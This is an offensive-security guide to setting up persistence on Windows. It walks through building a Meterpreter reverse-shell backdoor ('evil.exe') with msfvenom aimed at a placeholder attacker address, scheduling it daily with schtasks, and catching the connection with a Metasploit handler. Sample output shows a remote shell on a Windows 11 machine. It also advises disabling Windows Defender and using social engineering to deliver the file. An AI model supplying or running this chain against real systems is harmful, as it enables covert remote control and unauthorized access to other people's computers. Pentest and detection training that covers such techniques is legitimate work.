# Windows Persistence via Scheduled Task
This guide demonstrates how to create a reverse shell backdoor for Windows using `msfvenom`, and establish persistence by setting up a scheduled task.  
This technique allows for remote access via Metasploit's Meterpreter session.  


**Note:**  To test this on modern Windows systems, you need to disable Windows Defender/runtime protection.  

#### Step-by-Step Instructions 

#### 1. Create the Backdoor EXE with msfvenom 
Use `msfvenom` to generate a Windows executable file (`evil.exe`) that opens a reverse shell back to your Metasploit listener.  

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<YOUR-ATTACKER-ADDRESS> LPORT=4444 -f exe -o evil.exe
```


#### 2. Transfer the Backdoor EXE to the Target Machine 
You'll need to get `evil.exe` onto the target Windows machine.  
This can be done through various methods such as social engineering, exploiting a vulnerability, or using a different form of initial access.  


#### 3. Create a Scheduled Task to Maintain Persistence 
To set up the scheduled task that will run the backdoor executable at regular intervals, use the `schtasks` command.  
This example sets up a task named "EvilTask" that runs every day at 12:00 PM.  
Open a Command Prompt with administrative privileges and run the following command:  


```console
schtasks /create /tn "EvilTask" /tr "C:\path\to\evil.exe" /sc daily /st 12:00
```  

Replace `C:\path\to\evil.exe` with the actual path to `evil.exe` on the target machine.  

#### 5. Set Up a Metasploit Listener 

Start Metasploit and set up a listener to catch the reverse shell connection from the target machine.  


```bash
msfconsole
```  

Inside the Metasploit console, run the following commands to set up the listener:  


```msf
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <YOUR-ATTACKER-ADDRESS>
set LPORT 4444
exploit
```  


#### Sample Output 

After successfully triggering the backdoor and obtaining a Meterpreter session, you should see output similar to the following:  


```yaml
meterpreter > sysinfo
Computer        : WIN11
OS              : Windows 11 (10.0 Build 22631).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
meterpreter > 
meterpreter > shell
Process 5124 created.
Channel 1 created.
Microsoft Windows [Version 10.0.22631.3810]
(c) Microsoft Corporation. All rights reserved.

C:\Users\johnb\Desktop\tests\revshell\photos\photos>whoami
whoami
win11\johnb
```

### Summary 
 
1. **Generate**  the backdoor executable with `msfvenom`.  
2. **Transfer**  the `evil.exe` to the target machine.  
 
3. **Disable**  Windows Defender.  
 
4. **Create**  a scheduled task using `schtasks`.  
 
5. **Set up**  a Metasploit listener to catch the reverse shell connection.  


